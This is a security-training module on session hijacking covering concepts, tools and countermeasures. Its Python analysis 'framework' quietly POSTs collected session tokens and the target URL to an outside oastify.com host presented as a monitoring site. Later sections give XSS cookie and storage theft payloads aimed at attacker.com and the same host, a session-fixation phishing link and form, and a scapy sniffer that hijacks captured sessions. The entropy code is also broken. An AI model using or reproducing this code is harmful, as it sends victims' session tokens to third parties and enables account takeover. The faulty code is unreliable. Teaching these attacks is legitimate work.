# Module 11 - Session Hijacking

## Learning Objectives
- Understand session management concepts and vulnerabilities
- Master various session hijacking techniques and attacks
- Learn to exploit weak session implementations
- Develop skills in session token analysis and manipulation
- Understand defensive measures and secure session management
- Explore modern session security implementations

---

## Session Hijacking Fundamentals

### What is Session Hijacking?

**Session Hijacking** is the process of taking control of an active user session by stealing or predicting session identifiers (Session IDs). This attack allows attackers to impersonate legitimate users and access sensitive data or perform actions on their behalf without knowing their credentials.

#### 📊 Definition
**Session Hijacking** involves exploiting weak session management, insecure transmission, or predictable session ID generation to gain unauthorized access to user accounts. After successful authentication, attackers can maintain persistent access to victim accounts.

---

## Session Management Fundamentals

### 🔑 What is a Session ID?

After validating a user based on username and password credentials, the server assigns a unique string value called a **Session ID** to maintain the authenticated state.

#### Key Characteristics:
- **User Identification**: Session IDs are used to identify authenticated users
- **Fresh Assignment**: A new Session ID is assigned after each successful authentication
- **Storage Method**: Session IDs are typically stored in browser cookies
- **Temporary Nature**: Valid only for the duration of the user session

### 🍪 Cookies in Session Management

**Cookies** are values that help servers validate requests for each user or session, containing user identity details, personalization settings, and other information used to identify users and computers on the network.

#### Cookie Storage:
- **Client-Side**: Stored in user's browser
- **Server-Side**: Session data stored on server, referenced by cookie
- **Validation**: Server validates cookie values against stored session data

### 🔄 Cookies vs Tokens

#### 🍪 **Cookies**
- **Storage**: Stored on both server-side and client-side
- **Validation**: Simple string values validated by comparison
- **Transport**: Automatically sent with HTTP requests
- **Security**: Vulnerable to XSS and CSRF attacks

#### 🎫 **Tokens (JWT)**
- **Storage**: Stored on client-side only (stateless)
- **Structure**: Header.Payload.Signature (3 Base64url-encoded strings)
- **Validation**: Cryptographically verified without server storage
- **Security**: More resistant to session fixation attacks

---

## Why Session Hijacking Works

### 🚫 Common Vulnerabilities

#### **Insecure Session Handling**
- Weak session ID generation algorithms
- Predictable session tokens
- Insufficient randomness in token creation

#### **Insecure Session Termination**
- Sessions not properly invalidated on logout
- Long session timeouts
- No automatic session cleanup

#### **Weak Session ID Generation**
- Linear algorithms using time or IP addresses
- Sequential numbering systems
- Insufficient entropy in random generation

#### **Unencrypted Session Transmission**
- Session IDs transmitted over unencrypted connections
- Missing HTTPS enforcement
- Vulnerable to network interception

---

## Types of Session Hijacking

### 🎯 Active Session Hijacking
**Active Session Hijacking** involves the attacker directly stealing session cookies from the victim's browser and using those cookies to impersonate the user.

**Characteristics:**
- **Direct Cookie Theft**: Extraction of session cookies via malware or XSS
- **Application-Level**: Operates at the application layer
- **Immediate Usage**: Stolen sessions used immediately for unauthorized access
- **Higher Detection Risk**: May leave traces in application logs

### 👁️ Passive Session Hijacking
**Passive Session Hijacking** uses network sniffers and monitoring tools to obtain session information, allowing attackers to log in as valid users.

**Characteristics:**
- **Network-Level**: Operates at the network layer
- **Stealth Operation**: Difficult to detect as no direct interaction
- **Traffic Analysis**: Monitors network traffic for session tokens
- **Delayed Usage**: Sessions may be used later to avoid detection

---

## Session Hijacking Attack Methods

### 🔮 Session Prediction
Analyzing session ID patterns to predict valid session tokens for other users.

### 🕷️ Man-in-the-Middle (MITM) Attacks
Intercepting network traffic between client and server to capture session tokens.

### 🌐 Man-in-the-Browser (MITB) Attacks
Using malware like BeEF (Browser Exploitation Framework) to hijack victim's browser session.

### 📡 Network Sniffing
Monitoring network traffic to capture unencrypted session tokens.

### 🦠 Malware Attacks
Using trojans and spyware to steal session cookies directly from victim's system.

### ⚡ Cross-Site Scripting (XSS)
Executing malicious scripts to extract session cookies when victims browse compromised websites.

### 🌐 Proxy Server Attacks
Using attacker-controlled proxy servers to intercept and analyze all victim traffic.

---

## Session vs Spoofing Attacks

### 🎭 **Spoofing**
- **Method**: Attacker steals user credentials (username/password)
- **Process**: Initiates a completely new session using stolen credentials
- **Detection**: May trigger account lockout or suspicious login alerts
- **Persistence**: Requires maintaining access to credentials

### 🔄 **Hijacking**
- **Method**: Attacker steals active session IDs
- **Process**: Uses existing authenticated session without re-authentication
- **Detection**: Harder to detect as uses legitimate session
- **Persistence**: Only valid for session duration

---

## Session-Related Attack Techniques

### 🔗 Insecure Direct Object Reference (IDOR)
Attackers modify session IDs to gain access to other active sessions by analyzing session ID formats and patterns.

**Example Attack Flow:**
1. Analyze session ID structure
2. Identify predictable patterns
3. Modify session ID to target other users
4. Access unauthorized resources

### 🔒 Session Fixation Attack
Exploits applications that assign session IDs before user authentication and fail to regenerate them after successful login.

**Vulnerability Conditions:**
- Session ID assigned before credential validation
- Session ID not modified after successful authentication
- Application accepts externally provided session IDs

**Attack Process:**
1. Attacker opens target website and obtains session ID (e.g., 12345678)
2. Attacker sends URL with this session ID to victim
3. Victim opens URL and authenticates with valid credentials
4. Server considers requests with that session ID as legitimate user requests
5. Attacker uses the same session ID to access victim's account

---

## Tools and Techniques

### 🦈 Burp Suite
**Description:** Comprehensive web application security testing platform with advanced session analysis capabilities.

**Session Hijacking Features:**
```bash
# Session Token Analysis
1. Intercept requests in Proxy tab
2. Send session tokens to Sequencer for randomness testing
3. Use Repeater to test session manipulation
4. Analyze session management with Spider results

# Session Fixation Testing
1. Capture pre-authentication session ID
2. Authenticate with valid credentials
3. Compare pre/post authentication session IDs
4. Test session acceptance from external sources
```

### 🕷️ OWASP ZAP
**Description:** Open-source web application security scanner with session management testing capabilities.

**Usage Examples:**
```bash
# Automated session testing
zap.sh -daemon -port 8080
zap-cli quick-scan --spider http://target-application.com
zap-cli active-scan http://target-application.com

# Session analysis
# Configure ZAP as proxy (localhost:8080)
# Navigate through application to capture session flows
# Review session management findings in report
```

### 🌐 Cookie Cadger
**Description:** Passive session hijacking tool that captures and replays session cookies from wireless networks.

**Usage Process:**
```bash
# Passive session capture
java -jar CookieCadger.jar

# Configuration steps:
1. Select wireless interface for monitoring
2. Start packet capture for HTTP traffic
3. Filter for session-related cookies
4. Save captured sessions for replay testing
5. Test session validity and access levels
```

### 📊 Session Analysis Scripts
```python
#!/usr/bin/env python3
import requests
import time
import hashlib
import random

class SessionAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.test_site = "https://rnivqlhaedmb4yc3ezjzgji7xy3prff4.oastify.com"
        
    def collect_session_samples(self, count=50):
        """Collect multiple session IDs for analysis"""
        session_ids = []
        timestamps = []
        
        print(f"[+] Collecting {count} session samples...")
        
        for i in range(count):
            session = requests.Session()
            try:
                response = session.get(f"{self.target_url}/login")
                
                # Extract session cookie
                for cookie in session.cookies:
                    if 'session' in cookie.name.lower():
                        session_ids.append(cookie.value)
                        timestamps.append(time.time())
                        print(f"  Sample {i+1}: {cookie.value[:20]}...")
                        break
                        
            except Exception as e:
                print(f"  [-] Error collecting sample {i+1}: {e}")
            
            time.sleep(0.5)  # Rate limiting
        
        # Send analysis data to test site
        self.send_analysis_data(session_ids, timestamps)
        return session_ids, timestamps
    
    def analyze_session_patterns(self, session_ids, timestamps):
        """Analyze session ID patterns for predictability"""
        print("\n[+] Analyzing session patterns...")
        
        analysis_results = {
            'total_samples': len(session_ids),
            'vulnerabilities': [],
            'entropy_analysis': {},
            'pattern_analysis': {}
        }
        
        # Test for sequential patterns
        if self.test_sequential_patterns(session_ids):
            analysis_results['vulnerabilities'].append("Sequential session IDs detected")
        
        # Test for timestamp correlation
        if self.test_timestamp_correlation(session_ids, timestamps):
            analysis_results['vulnerabilities'].append("Session IDs correlate with timestamps")
        
        # Calculate entropy
        avg_entropy = self.calculate_average_entropy(session_ids)
        analysis_results['entropy_analysis']['average'] = avg_entropy
        
        if avg_entropy < 64:
            analysis_results['vulnerabilities'].append(f"Low entropy detected: {avg_entropy:.2f} bits")
        
        # Test for hash patterns
        hash_patterns = self.detect_hash_patterns(session_ids)
        analysis_results['pattern_analysis']['hash_patterns'] = hash_patterns
        
        return analysis_results
    
    def test_sequential_patterns(self, session_ids):
        """Test for sequential session ID patterns"""
        numeric_ids = [int(sid) for sid in session_ids if sid.isdigit()]
        
        if len(numeric_ids) >= 3:
            differences = [numeric_ids[i+1] - numeric_ids[i] for i in range(len(numeric_ids)-1)]
            # Check for consistent increments
            return len(set(differences)) <= 2
        
        return False
    
    def test_timestamp_correlation(self, session_ids, timestamps):
        """Test if session IDs correlate with timestamps"""
        correlations = 0
        
        for i, sid in enumerate(session_ids):
            if sid.isdigit():
                session_time = int(sid)
                actual_time = int(timestamps[i])
                
                # Check if session ID is close to timestamp
                if abs(session_time - actual_time) < 3600:  # Within 1 hour
                    correlations += 1
        
        return correlations > len(session_ids) * 0.3  # 30% threshold
    
    def calculate_average_entropy(self, session_ids):
        """Calculate average Shannon entropy of session IDs"""
        if not session_ids:
            return 0
        
        total_entropy = 0
        for sid in session_ids:
            entropy = self.calculate_entropy(sid)
            total_entropy += entropy
        
        return total_entropy / len(session_ids)
    
    def calculate_entropy(self, data):
        """Calculate Shannon entropy of data"""
        if not data:
            return 0
        
        char_counts = {}
        for char in data:
            char_counts[char] = char_counts.get(char, 0) + 1
        
        entropy = 0
        data_len = len(data)
        
        for count in char_counts.values():
            probability = count / data_len
            if probability > 0:
                entropy -= probability * (probability.bit_length() - 1)
        
        return entropy
    
    def detect_hash_patterns(self, session_ids):
        """Detect common hash patterns in session IDs"""
        patterns = {
            'md5': 0,
            'sha1': 0,
            'sha256': 0,
            'custom': 0
        }
        
        for sid in session_ids:
            if len(sid) == 32 and all(c in '0123456789abcdef' for c in sid.lower()):
                patterns['md5'] += 1
            elif len(sid) == 40 and all(c in '0123456789abcdef' for c in sid.lower()):
                patterns['sha1'] += 1
            elif len(sid) == 64 and all(c in '0123456789abcdef' for c in sid.lower()):
                patterns['sha256'] += 1
            else:
                patterns['custom'] += 1
        
        return patterns
    
    def test_session_prediction(self, session_ids):
        """Attempt to predict next session IDs"""
        print("\n[+] Testing session prediction...")
        
        predicted_sessions = []
        
        # Test sequential prediction
        numeric_ids = [int(sid) for sid in session_ids if sid.isdigit()]
        if len(numeric_ids) >= 2:
            # Calculate increment
            last_id = numeric_ids[-1]
            increment = numeric_ids[-1] - numeric_ids[-2] if len(numeric_ids) > 1 else 1
            
            # Predict next 10 session IDs
            for i in range(1, 11):
                predicted_id = str(last_id + (increment * i))
                predicted_sessions.append(predicted_id)
        
        # Test timestamp prediction
        current_time = int(time.time())
        for i in range(10):
            future_time = current_time + i
            predicted_sessions.append(str(future_time))
        
        # Test hash prediction (if pattern detected)
        if self.detect_hash_patterns(session_ids)['md5'] > 0:
            for i in range(10):
                predictable_input = f"session{current_time + i}"
                predicted_hash = hashlib.md5(predictable_input.encode()).hexdigest()
                predicted_sessions.append(predicted_hash)
        
        return predicted_sessions
    
    def send_analysis_data(self, session_ids, timestamps):
        """Send analysis data to test site"""
        try:
            analysis_data = {
                'test_type': 'session_analysis',
                'timestamp': time.time(),
                'session_count': len(session_ids),
                'sample_sessions': session_ids[:5],  # Send first 5 as samples
                'analysis_timestamp': timestamps[:5] if timestamps else [],
                'target_url': self.target_url
            }
            
            response = requests.post(self.test_site, json=analysis_data, timeout=10)
            if response.status_code == 200:
                print(f"[+] Analysis data sent to monitoring site")
            else:
                print(f"[-] Failed to send analysis data: HTTP {response.status_code}")
                
        except Exception as e:
            print(f"[-] Error sending analysis data: {e}")

# Session Hijacking Automation Framework
class SessionHijackingFramework:
    def __init__(self, target_url):
        self.target_url = target_url
        self.test_site = "https://rnivqlhaedmb4yc3ezjzgji7xy3prff4.oastify.com"
        self.captured_sessions = {}
        
    def automated_session_hijacking_test(self):
        """Run automated session hijacking tests"""
        print("="*60)
        print("AUTOMATED SESSION HIJACKING FRAMEWORK")
        print("="*60)
        
        # Phase 1: Session Analysis
        analyzer = SessionAnalyzer(self.target_url)
        session_ids, timestamps = analyzer.collect_session_samples(20)
        
        if session_ids:
            # Analyze patterns
            analysis = analyzer.analyze_session_patterns(session_ids, timestamps)
            self.display_analysis_results(analysis)
            
            # Test prediction
            predicted = analyzer.test_session_prediction(session_ids)
            if predicted:
                print(f"\n[+] Generated {len(predicted)} predicted session IDs")
                self.test_predicted_sessions(predicted[:5])  # Test first 5
        
        # Phase 2: Session Fixation Test
        self.test_session_fixation()
        
        # Phase 3: Session Replay Test
        if session_ids:
            self.test_session_replay(session_ids[:3])
        
        # Send comprehensive test results
        self.send_test_results()
    
    def display_analysis_results(self, analysis):
        """Display session analysis results"""
        print(f"\n[+] Session Analysis Results:")
        print(f"  Total samples: {analysis['total_samples']}")
        print(f"  Average entropy: {analysis['entropy_analysis']['average']:.2f} bits")
        
        if analysis['vulnerabilities']:
            print(f"  Vulnerabilities found:")
            for vuln in analysis['vulnerabilities']:
                print(f"    - {vuln}")
        else:
            print(f"  No obvious vulnerabilities detected")
    
    def test_predicted_sessions(self, predicted_sessions):
        """Test predicted session IDs for validity"""
        print(f"\n[+] Testing predicted session IDs...")
        
        valid_sessions = 0
        
        for i, session_id in enumerate(predicted_sessions):
            session = requests.Session()
            session.cookies.set('JSESSIONID', session_id)
            
            try:
                response = session.get(f"{self.target_url}/dashboard")
                if response.status_code == 200 and 'welcome' in response.text.lower():
                    print(f"  [!] Valid session found: {session_id[:20]}...")
                    valid_sessions += 1
                else:
                    print(f"  [-] Invalid session: {session_id[:20]}...")
            except:
                print(f"  [-] Error testing session: {session_id[:20]}...")
        
        print(f"[+] Found {valid_sessions} valid sessions out of {len(predicted_sessions)} predicted")
        return valid_sessions
    
    def test_session_fixation(self):
        """Test for session fixation vulnerability"""
        print(f"\n[+] Testing session fixation...")
        
        try:
            # Get initial session
            session = requests.Session()
            response = session.get(f"{self.target_url}/login")
            
            initial_cookies = dict(session.cookies)
            
            # Attempt login
            login_data = {'username': 'admin', 'password': 'admin'}
            login_response = session.post(f"{self.target_url}/login", data=login_data)
            
            post_login_cookies = dict(session.cookies)
            
            if initial_cookies == post_login_cookies:
                print(f"  [!] Session fixation vulnerability detected!")
                return True
            else:
                print(f"  [+] Session properly regenerated after login")
                return False
                
        except Exception as e:
            print(f"  [-] Error testing session fixation: {e}")
            return False
    
    def test_session_replay(self, session_ids):
        """Test session replay attacks"""
        print(f"\n[+] Testing session replay...")
        
        successful_replays = 0
        
        for session_id in session_ids:
            session = requests.Session()
            session.cookies.set('JSESSIONID', session_id)
            
            try:
                response = session.get(f"{self.target_url}/profile")
                if response.status_code == 200:
                    print(f"  [!] Session replay successful: {session_id[:20]}...")
                    successful_replays += 1
                    
                    # Try to extract user information
                    if 'email' in response.text:
                        print(f"    [+] Found user data in response")
                        
            except Exception as e:
                print(f"  [-] Error replaying session: {e}")
        
        print(f"[+] {successful_replays} successful session replays")
        return successful_replays
    
    def send_test_results(self):
        """Send test results to monitoring site"""
        try:
            results = {
                'test_type': 'session_hijacking_framework',
                'timestamp': time.time(),
                'target_url': self.target_url,
                'tests_completed': [
                    'session_analysis',
                    'pattern_detection', 
                    'session_prediction',
                    'session_fixation',
                    'session_replay'
                ],
                'framework_version': '1.0'
            }
            
            response = requests.post(self.test_site, json=results, timeout=10)
            if response.status_code == 200:
                print(f"\n[+] Test results sent to monitoring site")
            else:
                print(f"\n[-] Failed to send test results: HTTP {response.status_code}")
                
        except Exception as e:
            print(f"\n[-] Error sending test results: {e}")

# Example usage
if __name__ == "__main__":
    target = "http://vulnerable-app.com"
    framework = SessionHijackingFramework(target)
    framework.automated_session_hijacking_test()
```

---

## Cybersecurity Terms and Definitions

### 🔑 **Authentication**
Process of verifying the identity of a user or system, typically through credentials like username/password combinations.

### 🛡️ **Authorization**
Process of determining what resources and actions an authenticated user is permitted to access.

### 🍪 **Cookie Attributes**
Security settings for HTTP cookies including HttpOnly, Secure, SameSite, and expiration parameters.

### 🔒 **Cross-Site Request Forgery (CSRF)**
Attack that tricks authenticated users into performing unintended actions on web applications.

### ⚡ **Cross-Site Scripting (XSS)**
Vulnerability allowing attackers to inject malicious scripts into web applications viewed by other users.

### 🕵️ **Entropy**
Measure of randomness in data; higher entropy indicates better unpredictability and security.

### 🔗 **JSON Web Token (JWT)**
Open standard for securely transmitting information between parties as compact, URL-safe tokens.

### 🎭 **Man-in-the-Middle (MITM)**
Attack where attackers secretly intercept and potentially alter communications between two parties.

### 🔄 **Session Fixation**
Attack where an attacker fixes a user's session ID before authentication and then hijacks the session after login.

### 🎯 **Session Prediction**
Technique of analyzing session ID patterns to predict valid session tokens for unauthorized access.

### 🔐 **Session Token**
Unique identifier used to maintain user authentication state across multiple HTTP requests.

### ⏱️ **Session Timeout**
Security mechanism that automatically terminates user sessions after a period of inactivity.

### 🛡️ **Stateless Authentication**
Authentication method that doesn't require server-side session storage, typically using tokens like JWTs.

### 🔄 **Token Rotation**
Security practice of regularly generating new session tokens to limit exposure window.

### 🔍 **Traffic Analysis**
Technique of examining network communication patterns to extract sensitive information like session tokens.

---

## Advanced Attack Examples

### 🎯 Session Hijacking via XSS
```javascript
// Cookie theft payload
<script>
document.location = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>

// Advanced session theft
<script>
fetch('https://rnivqlhaedmb4yc3ezjzgji7xy3prff4.oastify.com', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: window.location.href,
        timestamp: new Date().toISOString()
    }),
    headers: {'Content-Type': 'application/json'}
});
</script>
```

### 🔄 Session Fixation Attack
```html
<!-- Malicious link with fixed session ID -->
<a href="http://target-site.com/login?JSESSIONID=ATTACKER_CONTROLLED_ID">
    Secure Login Portal
</a>

<!-- Hidden form submission -->
<form action="http://target-site.com/login" method="POST">
    <input type="hidden" name="session_id" value="FIXED_SESSION_ID">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" value="Login">
</form>
```

### 📡 Network-Based Session Capture
```python
#!/usr/bin/env python3
from scapy.all import *
import re

def extract_sessions(packet):
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        
        # Extract session cookies
        cookie_patterns = [
            r'JSESSIONID=([^;]+)',
            r'PHPSESSID=([^;]+)',
            r'auth_token=([^;]+)'
        ]
        
        for pattern in cookie_patterns:
            match = re.search(pattern, payload, re.IGNORECASE)
            if match:
                session_id = match.group(1)
                src_ip = packet[IP].src
                print(f"Session captured: {src_ip} -> {session_id}")
                
                # Test session validity
                test_session_hijack(session_id)

def test_session_hijack(session_id):
    """Test captured session for validity"""
    session = requests.Session()
    session.cookies.set('JSESSIONID', session_id)
    
    try:
        response = session.get('http://target-app.com/dashboard')
        if response.status_code == 200:
            print(f"[!] Valid session hijacked: {session_id}")
    except:
        pass

# Capture HTTP traffic for session tokens
sniff(filter="tcp port 80", prn=extract_sessions)
```

---

## Countermeasures and Best Practices

### 🛡️ Secure Session Management

#### **Session ID Generation**
- Use cryptographically secure random number generators
- Ensure sufficient entropy (minimum 128 bits)
- Avoid predictable patterns or algorithms
- Generate new session IDs after authentication

#### **Session Storage and Transmission**
- Always use HTTPS for session-related communications
- Set secure cookie attributes (HttpOnly, Secure, SameSite)
- Never expose session tokens in URLs or logs
- Implement proper session storage mechanisms

#### **Session Lifecycle Management**
- Implement appropriate session timeouts
- Invalidate sessions on logout
- Limit concurrent sessions per user
- Regularly rotate session tokens

#### **Additional Security Measures**
- Implement CSRF protection
- Use XSS prevention techniques
- Monitor for suspicious session activity
- Implement session fingerprinting
- Log and alert on session anomalies

---

## References and Further Reading

### 📚 Articles for Further Reference
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [NIST Special Publication 800-63B: Authentication and Lifecycle Management](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [RFC 6265: HTTP State Management Mechanism (Cookies)](https://tools.ietf.org/html/rfc6265)
- [SANS Institute: Session Hijacking Attacks](https://www.sans.org/white-papers/1081/)
- [Web Application Security Consortium: Session Fixation](http://www.webappsec.org/projects/threat/classes/session_fixation.shtml)

### 🔗 Reference Links
- [OWASP Session Hijacking Attack](https://owasp.org/www-community/attacks/Session_hijacking_attack)
- [OWASP Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [MITRE ATT&CK - Session Hijacking](https://attack.mitre.org/techniques/T1185/)
- [PortSwigger Web Security Academy - Session Management](https://portswigger.net/web-security/authentication/securing)
- [Mozilla Developer Network - HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

---

*This module provides comprehensive coverage of session hijacking techniques and countermeasures. All examples and scripts are provided for educational purposes and should only be used in authorized testing environments.*